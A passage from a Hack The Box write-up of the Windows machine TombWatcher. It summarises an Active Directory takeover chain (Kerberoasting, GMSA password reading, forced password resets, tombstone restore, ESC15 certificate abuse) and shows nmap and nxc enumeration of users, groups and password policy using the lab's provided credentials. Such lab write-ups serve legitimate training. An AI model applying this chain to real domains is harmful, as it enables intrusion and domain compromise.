---
title: "🪦 HTB TombWatcher Write-up"
name: TombWatcher
date: 2025-10-12
os: Windows
difficulty: Medium
skills: "Enumeration, ACE Abuse, Kerberoasting, Password Cracking, GMSA Password Read, Tombstone Restore, ESC15, Privilege Escalation"
tools: "rustscan, nmap, nxc, bloodhound-python, BloodHound, targetedKerberoast, hashcat, bloodyAD, gMSADumper, impacket-owneredit, impacket-dacledit, evil-winrm"
published: true
---
![](images/Pasted%20image%2020250718182826.png)

```
Machine Information

As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!
```

## 📝 Summary

TombWatcher was an interesting machine, focusing heavily on AD ACE abuse through a complex attack chain and ADCS escalation using ESC15.

- The AD ACE attack chain kicked off with Henry Kerberoasting Alfred.  Alfred’s password was laughably weak, so cracking it was trivial.
- Alfred could add himself as a member to the `INFRASTRUCTURE` group.  
- The `INFRASTRUCTURE` group could read the GMSA password hash for the `ANSIBLE_DEV$` computer account.  
- The `ANSIBLE_DEV$` computer account was then used to force a password change for user Sam.  
- Sam then changed John's password.

John was a member of `Remote Management Users`, so I could WinRM to the target using `evil-winrm`.  John also had permissions to restore deleted AD objects (tombstones) - hence the machines' name: *TombWatcher*.
John controlled the deleted `cert_admin` account: he restored it and changed its password.

I ran `certipy-ad` with the `cert_admin` credentials to probe ADCS and it flagged the ESC15 vulnerability. Following the Certipy ESC15 Wiki exploitation steps exposed the domain Administrator NTLM hash, and lead to full domain compromise.

## 🔗 AD ACE abuse attack chain

### 🔎 Recon

The **initial scan** revealed opened ports for a Windows Active Directory server, including access through WinRM port `5985/tcp`.  `nmap` showed the heavy use of certificates, indicating the presence of an Active Directory Certificate Services.

```
fcoomans@kali:~/htb/tombwatcher$ rustscan -a 10.10.11.72 --tries 5 --ulimit 10000 -- -sCV -oA tombwatcher_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.72:53
Open 10.10.11.72:80
Open 10.10.11.72:88
Open 10.10.11.72:135
Open 10.10.11.72:139
Open 10.10.11.72:389
Open 10.10.11.72:445
Open 10.10.11.72:464
Open 10.10.11.72:593
Open 10.10.11.72:636
Open 10.10.11.72:3268
Open 10.10.11.72:3269
Open 10.10.11.72:5985
Open 10.10.11.72:9389
Open 10.10.11.72:49666
Open 10.10.11.72:49691
Open 10.10.11.72:49692
Open 10.10.11.72:49693
Open 10.10.11.72:49712
Open 10.10.11.72:49718
Open 10.10.11.72:49737
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA tombwatcher_tcp_all" on ip 10.10.11.72
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-18 13:55 SAST

<SNIP>

Nmap scan report for 10.10.11.72
Host is up, received echo-reply ttl 127 (0.17s latency).
Scanned at 2025-07-18 13:55:44 SAST for 100s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-18 09:07:01Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
|_ssl-date: 2025-07-18T09:08:44+00:00; -2h48m40s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-18T09:08:42+00:00; -2h48m40s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
|_ssl-date: 2025-07-18T09:08:44+00:00; -2h48m40s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-18T09:08:42+00:00; -2h48m40s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49718/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49737/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

After pointing `tombwatcher.htb` and `dc01.tombwatcher.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/tombwatcher$ grep tombwatcher.htb /etc/hosts
10.10.11.72     tombwatcher.htb dc01.tombwatcher.htb
```

I ran an `nmap` UDP port scan, that detected UDP-related Windows Active Directory services.

```
fcoomans@kali:~/htb/tombwatcher$ nmap --top-ports 100 --open -sU tombwatcher.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-18 13:58 SAST
Nmap scan report for tombwatcher.htb (10.10.11.72)
Host is up (0.17s latency).
Not shown: 97 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp

Nmap done: 1 IP address (1 host up) scanned in 7.67 seconds
```

```
fcoomans@kali:~/htb/tombwatcher$ sudo ntpdate dc01.tombwatcher.htb
2025-07-18 11:10:55.916311 (+0200) -10106.318620 +/- 0.082921 dc01.tombwatcher.htb 10.10.11.72 s1 no-leap
CLOCK: time stepped by -10106.318620
```

Using the provided credentials with `nxc`; only a handful of domain users and services exist on the target.

```
fcoomans@kali:~/htb/tombwatcher$ nxc ldap dc01.tombwatcher.htb -u henry -p H3nry_987TGV! --users
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
LDAP        10.10.11.72     389    DC01             [*] Enumerated 7 domain users: tombwatcher.htb
LDAP        10.10.11.72     389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.10.11.72     389    DC01             Administrator                 2025-04-25 16:56:03 0        Built-in account for administering the computer/domain
LDAP        10.10.11.72     389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.10.11.72     389    DC01             krbtgt                        2024-11-16 02:02:28 0        Key Distribution Center Service Account
LDAP        10.10.11.72     389    DC01             Henry                         2025-05-12 17:17:03 0
LDAP        10.10.11.72     389    DC01             Alfred                        2025-05-12 17:17:03 0
LDAP        10.10.11.72     389    DC01             sam                           2025-05-12 17:17:03 0
LDAP        10.10.11.72     389    DC01             john                          2025-05-19 15:25:10 0
```

Group membership were also queried.  The user John can WinRM into the target.

```
fcoomans@kali:~/htb/tombwatcher$ nxc ldap dc01.tombwatcher.htb -u henry -p H3nry_987TGV! --groups |grep -v "membercount: 0"
LDAP                     10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP                     10.10.11.72     389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
LDAP                     10.10.11.72     389    DC01             Administrators                           membercount: 3
LDAP                     10.10.11.72     389    DC01             Users                                    membercount: 4
LDAP                     10.10.11.72     389    DC01             Guests                                   membercount: 2
LDAP                     10.10.11.72     389    DC01             Certificate Service DCOM Access          membercount: 1
LDAP                     10.10.11.72     389    DC01             Remote Management Users                  membercount: 1
LDAP                     10.10.11.72     389    DC01             Schema Admins                            membercount: 1
LDAP                     10.10.11.72     389    DC01             Enterprise Admins                        membercount: 1
LDAP                     10.10.11.72     389    DC01             Cert Publishers                          membercount: 1
LDAP                     10.10.11.72     389    DC01             Domain Admins                            membercount: 1
LDAP                     10.10.11.72     389    DC01             Group Policy Creator Owners              membercount: 1
LDAP                     10.10.11.72     389    DC01             Pre-Windows 2000 Compatible Access       membercount: 2
LDAP                     10.10.11.72     389    DC01             Windows Authorization Access Group       membercount: 1
LDAP                     10.10.11.72     389    DC01             Denied RODC Password Replication Group   membercount: 8

fcoomans@kali:~/htb/tombwatcher$ nxc ldap dc01.tombwatcher.htb -u henry -p H3nry_987TGV! --groups Administrators
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
LDAP        10.10.11.72     389    DC01             Domain Admins
LDAP        10.10.11.72     389    DC01             Enterprise Admins
LDAP        10.10.11.72     389    DC01             Administrator

fcoomans@kali:~/htb/tombwatcher$ nxc ldap dc01.tombwatcher.htb -u henry -p H3nry_987TGV! --groups "Remote Management Users"
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
LDAP        10.10.11.72     389    DC01             john
```

The password policy showed that there was no account lockout configured.  So, on-line brute forcing and other password discovery techniques could be used without fear of locking domain accounts.

```
fcoomans@kali:~/htb/tombwatcher$ nxc smb dc01.tombwatcher.htb -u henry -p H3nry_987TGV! --pass-pol
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
SMB         10.10.11.72     445    DC01             [+] Dumping password info for domain: TOMBWATCHER
SMB         10.10.11.72     445    DC01             Minimum password length: 1
SMB         10.10.11.72     445    DC01             Password history length: 24
SMB         10.10.11.72     445    DC01             Maximum password age: Not Set
